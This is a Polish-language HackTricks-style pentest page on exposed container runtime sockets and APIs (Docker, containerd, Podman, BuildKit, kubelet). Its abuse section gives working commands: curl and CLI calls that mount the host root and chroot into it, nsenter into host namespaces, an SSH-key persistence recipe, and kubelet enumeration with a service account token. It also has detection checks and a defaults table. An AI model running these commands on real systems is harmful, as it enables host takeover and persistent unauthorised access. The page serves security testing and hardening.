# Ekspozycja Runtime API i Daemon

{{#include ../../../banners/hacktricks-training.md}}

## Przegląd

Wiele rzeczywistych kompromitacji kontenerów wcale nie zaczyna się od ucieczki z namespace. Zaczynają się od dostępu do płaszczyzny kontroli runtime. Jeśli workload może komunikować się z `dockerd`, `containerd`, CRI-O, Podmanem lub kubeletem za pośrednictwem zamontowanego Unix socketu albo wystawionego listenera TCP, attacker może być w stanie zażądać utworzenia nowego kontenera z większymi uprawnieniami, zamontować system plików hosta, dołączyć do namespace hosta lub pobrać wrażliwe informacje o węźle. W takich przypadkach runtime API jest rzeczywistą granicą bezpieczeństwa, a jego skompromitowanie jest funkcjonalnie zbliżone do skompromitowania hosta.

Dlatego ekspozycję runtime socketu należy dokumentować oddzielnie od zabezpieczeń kernela. Kontener ze standardowym seccomp, capabilities i ograniczeniem MAC nadal może być o jedno wywołanie API od kompromitacji hosta, jeśli `/var/run/docker.sock` lub `/run/containerd/containerd.sock` jest zamontowany wewnątrz niego. Izolacja kernela bieżącego kontenera może działać dokładnie zgodnie z założeniami, podczas gdy płaszczyzna zarządzania runtime pozostaje w pełni wystawiona.

## Modele dostępu do Daemona

Docker Engine tradycyjnie wystawia swoje uprzywilejowane API przez lokalny Unix socket pod adresem `unix:///var/run/docker.sock`. Historycznie był również wystawiany zdalnie przez listenery TCP, takie jak `tcp://0.0.0.0:2375`, albo przez listener zabezpieczony TLS na porcie `2376`. Zdalne wystawienie daemona bez silnego TLS i uwierzytelniania klienta skutecznie zmienia Docker API w zdalny interfejs root.

containerd, CRI-O, Podman i kubelet wystawiają podobne, wysokiego ryzyka powierzchnie ataku. Nazwy i workflow różnią się, ale logika pozostaje taka sama. Jeśli interfejs pozwala wywołującemu tworzyć workloady, montować ścieżki hosta, pobierać credentials lub modyfikować działające kontenery, jest on uprzywilejowanym kanałem zarządzania i należy traktować go odpowiednio.

Typowe lokalne ścieżki, które warto sprawdzić, to:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Starsze lub bardziej wyspecjalizowane stacki mogą również udostępniać endpointy, takie jak `dockershim.sock`, `frakti.sock` lub `rktlet.sock`. Są one mniej powszechne we współczesnych środowiskach, ale po ich napotkaniu należy zachować taką samą ostrożność, ponieważ stanowią powierzchnie kontroli runtime'u, a nie zwykłe sockety aplikacji.

## Secure Remote Access

Jeśli daemon musi być udostępniony poza lokalnym socketem, połączenie powinno być chronione za pomocą TLS, a najlepiej także wzajemnego uwierzytelniania, tak aby daemon weryfikował klienta, a klient weryfikował daemon. Stary zwyczaj otwierania Docker daemonu przez zwykły HTTP dla wygody jest jednym z najniebezpieczniejszych błędów w administracji kontenerami, ponieważ powierzchnia API jest wystarczająco rozbudowana, aby bezpośrednio tworzyć uprzywilejowane kontenery.

Historyczny wzorzec konfiguracji Dockera wyglądał następująco:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Na hostach opartych na systemd komunikacja z daemonem może również występować jako `fd://`, co oznacza, że proces dziedziczy wcześniej otwarty socket od systemd, zamiast samodzielnie go bindować. Najważniejsza lekcja nie dotyczy dokładnej składni, lecz konsekwencji dla security. W momencie, gdy daemon nasłuchuje poza lokalnym socketem z rygorystycznie ustawionymi uprawnieniami, bezpieczeństwo transportu i uwierzytelnianie klienta stają się obowiązkowe, a nie opcjonalnym hardeningiem.

## Abuse

Jeśli socket runtime jest obecny, potwierdź, który to socket, czy istnieje kompatybilny klient oraz czy możliwy jest dostęp przez raw HTTP lub gRPC:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
Te polecenia są przydatne, ponieważ pozwalają odróżnić nieistniejącą ścieżkę, zamontowany, ale niedostępny socket oraz działające uprzywilejowane API. Jeśli klient zadziała, kolejne pytanie brzmi, czy API może uruchomić nowy kontener z host bind mountem lub współdzieleniem host namespace.

### Gdy nie jest zainstalowany żaden klient

Brak `docker`, `podman` lub innego przyjaznego CLI nie oznacza, że socket jest bezpieczny. Docker Engine komunikuje się za pośrednictwem HTTP przez swój Unix socket, a Podman udostępnia zarówno API zgodne z Dockerem, jak i natywne API Libpod za pośrednictwem `podman system service`. Oznacza to, że minimalne środowisko zawierające tylko `curl` może nadal wystarczyć do sterowania daemonem:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
Ma to znaczenie podczas post-exploitation, ponieważ obrońcy czasami usuwają standardowe client binaries, ale pozostawiają zamontowany management socket. Na hostach Podman pamiętaj, że ścieżka o wysokiej wartości różni się w przypadku wdrożeń rootful i rootless: `unix:///run/podman/podman.sock` dla instancji usług rootful oraz `unix://$XDG_RUNTIME_DIR/podman/podman.sock` dla instancji rootless.

### Pełny przykład: Docker Socket do uprawnień root hosta

Jeśli `docker.sock` jest dostępny, klasyczne escape polega na uruchomieniu nowego kontenera, który montuje główny system plików hosta, a następnie wykonaniu w nim `chroot`:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Zapewnia to bezpośrednie wykonanie z uprawnieniami host-root za pośrednictwem Docker daemon. Wpływ nie ogranicza się do odczytu plików. Po wejściu do nowego kontenera attacker może modyfikować pliki hosta, pozyskiwać credentials, implantować persistence lub uruchamiać dodatkowe uprzywilejowane workloads.

### Pełny przykład: Docker Socket do Host Namespaces

Jeśli attacker preferuje wejście do namespace zamiast dostępu wyłącznie do systemu plików:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Ta ścieżka dociera do hosta, prosząc runtime o utworzenie nowego kontenera z jawną ekspozycją przestrzeni nazw hosta, zamiast wykorzystywać bieżący kontener.

### Wzorzec persistence przez Docker Socket

Kontrola runtime może być również używana do persistence zamiast jednorazowego shell. Ogólny wzorzec polega na utworzeniu pomocniczego kontenera z host mount, zapisaniu materiału autoryzacyjnego lub hooka startowego do zamontowanego systemu plików hosta, a następnie sprawdzeniu, czy host go wykorzystuje.

Przykładowy schemat:
```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```
Ta sama idea może być skierowana na jednostki systemd, fragmenty cron, pliki startowe aplikacji lub klucze SSH, w zależności od tego, co operator chce udowodnić. Najważniejsze jest to, że trwała zmiana jest wprowadzana za pośrednictwem uprawnień daemona runtime do systemu plików hosta, a nie dzięki dodatkowym uprawnieniom w oryginalnym kontenerze.

### Pivot przez pomocnika surowego Docker API

Gdy brakuje Docker CLI, ten sam przepływ z helper containerem i montowaniem hosta może być realizowany przez HTTP za pośrednictwem Unix socket. Ogólny przepływ wygląda następująco: potwierdź API, utwórz helper container z host bind mount, uruchom go, utwórz instancję exec, a następnie uruchom ten exec.
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
-X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
-X POST http://localhost/v1.54/containers/helper/exec
```
Końcowe żądanie `/exec/<id>/start` zależy od zwróconego identyfikatora exec, ale kwestia bezpieczeństwa jest niezależna od dokładnej obsługi JSON: bezpośredni dostęp API do rootful Docker daemon wystarczy, aby zażądać silniejszego pomocniczego workloadu.

### Pełny przykład: gniazdo containerd

Zamontowane gniazdo `containerd` jest zwykle równie niebezpieczne:<sup>[[1]](#references)</sup>
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Jeśli dostępny jest klient bardziej przypominający Docker, `nerdctl` może być wygodniejszy niż `ctr`, ponieważ udostępnia znane flagi, takie jak `--privileged`, `--pid=host` i `-v`:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
Skutkiem jest ponownie przejęcie hosta. Nawet jeśli brakuje narzędzi specyficznych dla Dockera, inny runtime API może nadal zapewniać tę samą władzę administracyjną. Na węzłach Kubernetes `crictl` może również wystarczyć do rozpoznania i interakcji z kontenerami, ponieważ komunikuje się bezpośrednio z endpointem CRI.

### Gniazdo BuildKit

`buildkitd` łatwo przeoczyć, ponieważ często jest postrzegany jako „tylko backend buildów”, ale daemon nadal stanowi uprzywilejowaną płaszczyznę kontroli. Dostępne `buildkitd.sock` może umożliwić attackerowi uruchamianie dowolnych kroków builda, sprawdzanie możliwości workera, używanie lokalnych kontekstów z przejętego środowiska oraz żądanie niebezpiecznych uprawnień, takich jak `network.host` lub `security.insecure`, jeśli daemon został skonfigurowany tak, aby na nie zezwalać.

Przydatne pierwsze interakcje to:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
Jeśli daemon akceptuje żądania budowania, sprawdź, czy dostępne są niezabezpieczone uprawnienia:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
Dokładny wpływ zależy od konfiguracji daemona, ale rootful BuildKit service z permissive entitlements nie jest nieszkodliwym udogodnieniem dla developerów. Traktuj go jako kolejną wysokowartościową powierzchnię administracyjną, szczególnie na CI runners i współdzielonych węzłach build.

### API kubeleta przez TCP

kubelet nie jest container runtime, ale nadal stanowi część płaszczyzny zarządzania węzłem i często znajduje się w tej samej granicy zaufania. Jeśli secure port kubeleta `10250` jest osiągalny z workloadu albo ujawnione zostaną credentials węzła, kubeconfigi lub uprawnienia proxy, attacker może być w stanie wyliczyć Pods, pobierać logi lub wykonywać polecenia w kontenerach lokalnych dla węzła bez jakiegokolwiek kontaktu ze ścieżką admission serwera Kubernetes API.

Zacznij od szybkiego rozpoznania:
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
Jeśli kubelet lub ścieżka proxy API-server autoryzuje `exec`, klient obsługujący WebSocket może wykorzystać to do code execution w innych kontenerach na node. Dlatego `nodes/proxy` z samym uprawnieniem `get` jest bardziej niebezpieczne, niż mogłoby się wydawać: żądanie nadal może dotrzeć do endpointów kubelet, które wykonują polecenia, a te bezpośrednie interakcje z kubelet nie pojawiają się w normalnych logach audytowych Kubernetes.<sup>[[2]](#references)</sup>

## Kontrole

Celem tych kontroli jest ustalenie, czy kontener może dotrzeć do jakiejkolwiek płaszczyzny zarządzania, która powinna pozostać poza granicą zaufania.
```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
Co jest tutaj interesujące:

- Zamontowany socket runtime jest zwykle bezpośrednią możliwością administracyjną, a nie jedynie ujawnieniem informacji.
- Listener TCP na `2375` bez TLS należy traktować jako warunek umożliwiający zdalne przejęcie.
- Zmienne środowiskowe, takie jak `DOCKER_HOST`, często ujawniają, że workload został celowo zaprojektowany do komunikacji z runtime hosta.

## Domyślne ustawienia Runtime

| Runtime / platforma | Stan domyślny | Domyślne działanie | Częste ręczne osłabienie zabezpieczeń |
| --- | --- | --- | --- |
| Docker Engine | Domyślnie lokalny Unix socket | `dockerd` nasłuchuje na lokalnym sockecie, a daemon zwykle działa z uprawnieniami root | montowanie `/var/run/docker.sock`, wystawienie `tcp://...:2375`, słaby lub brak TLS na `2376` |
| Podman | Domyślnie CLI bez daemona | Do zwykłego lokalnego użycia nie jest wymagany długotrwale działający uprzywilejowany daemon; sockety API mogą jednak zostać wystawione po włączeniu `podman system service` | wystawienie `podman.sock`, szerokie uruchomienie usługi, użycie rootful API |
| containerd | Lokalny uprzywilejowany socket | Administracyjne API jest wystawione przez lokalny socket i zwykle używane przez narzędzia wyższego poziomu | montowanie `containerd.sock`, szeroki dostęp przez `ctr` lub `nerdctl`, wystawienie uprzywilejowanych namespace’ów |
| CRI-O | Lokalny uprzywilejowany socket | Endpoint CRI jest przeznaczony dla zaufanych komponentów lokalnych dla noda | montowanie `crio.sock`, wystawienie endpointu CRI niezaufanym workloadom |
| Kubernetes kubelet | Lokalny dla noda management API | Kubelet nie powinien być szeroko dostępny z Podów; dostęp może ujawniać stan Podów, credentials i funkcje wykonywania poleceń, zależnie od authn/authz | montowanie socketów kubeleta lub certyfikatów, słabe uwierzytelnianie kubeleta, host networking wraz z dostępnym endpointem kubeleta |

## References

- [1] [eksploatacja socketu containerd, część 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Ryzyka obejścia Kubernetes API Server](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
